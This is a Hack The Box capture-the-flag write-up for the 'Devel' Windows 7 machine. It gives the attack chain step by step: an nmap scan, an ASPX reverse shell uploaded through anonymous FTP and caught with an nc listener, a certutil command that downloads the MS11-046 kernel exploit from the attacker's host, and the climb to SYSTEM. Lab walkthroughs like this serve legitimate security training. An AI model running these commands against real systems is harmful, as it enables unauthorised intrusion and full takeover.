---
clayout: ctf
title: Devel
date: 2025-08-26
image: /ctf/hack-the-box/machines/devel/info-card.png
type: Hack The Box

ctf:
    - name: Devel
      link: https://app.hackthebox.com/machines/3
      thumbnail: /ctf/hack-the-box/machines/devel/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/3
          thumbnail: /ctf/hack-the-box/machines/devel/pwned.png
---

## Machine Overview

The target, **Devel (10.10.10.5)**, is a Windows 7 Enterprise host running Microsoft IIS 7.5. An FTP service is available with anonymous access enabled. By leveraging this misconfiguration, we can upload a malicious ASPX payload to obtain initial access. Privilege escalation is achieved through a kernel exploit (MS11-046), leading to full `NT AUTHORITY\SYSTEM` compromise.

## Enumeration

### Nmap Scan

We start with an `nmap` scan to identify open ports and running services:

```bash
nmap -sC -sV -Pn -A -oN nmap.txt 10.10.10.5
```

**Scan Results:**

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

Key findings:

* **FTP (21/tcp)** allows anonymous login.
* **HTTP (80/tcp)** hosts Microsoft IIS 7.5 with a default IIS7 page.

### FTP Enumeration

Anonymous login is permitted:

```bash
ftp> ls -al 
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

Files in this directory (`iisstart.htm`, `welcome.png`) are also accessible via the web server. This confirms the FTP root is directly mapped to the IIS web root (`C:\inetpub\wwwroot`).

### Web Enumeration

Navigating to `http://10.10.10.5/` shows the IIS7 default welcome page:

![Home Page](/ctf/hack-the-box/machines/devel/home.png)

Since the web root is writable via FTP, we can upload a malicious `.aspx` file that will be executed by IIS.

## Initial Foothold

We upload an ASPX reverse shell:

```bash
ftp> put shell.aspx shell.aspx
```

Then start a listener on our attacking machine:

```bash
nc -lvnp 4444
```

Trigger the payload by browsing to:

```text
http://10.10.10.5/shell.aspx
```

A shell callback is received:

```bash
c:\windows\system32\inetsrv> whoami
iis apppool\web
```

At this point, we have code execution as the IIS AppPool identity.

## Privilege Escalation

### System Enumeration

Checking system information:

```cmd
c:\windows\system32\inetsrv> systeminfo
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
```

The host runs **Windows 7 Enterprise (Build 7600)** with no service packs applied — a strong indicator of kernel-level vulnerabilities.

### Exploit Selection

A search identifies [MS11-046](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046) (AFD.sys Privilege Escalation) as a working exploit for this system. Precompiled binaries are publicly available, e.g., from [SecWiki](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046).

### Exploit Delivery

We host the exploit on our attacker machine:

```bash
python3 -m http.server 8000
```

On the target, we download it using `certutil`:

```bash
certutil -urlcache -f http://10.10.14.2:8000/ms11-046.exe ms11-046.exe
```

### Exploitation

Execute the exploit:

```bash
C:\Users\Public> ms11-046.exe
```

Check privileges:

```bash
c:\Windows\System32> whoami
nt authority\system
```

We now have full SYSTEM-level access.

> [!INFO] **User & Root Flags**
>
> * User: `C:\Users\babis\Desktop\user.txt`
> * Root: `C:\Users\Administrator\Desktop\root.txt`
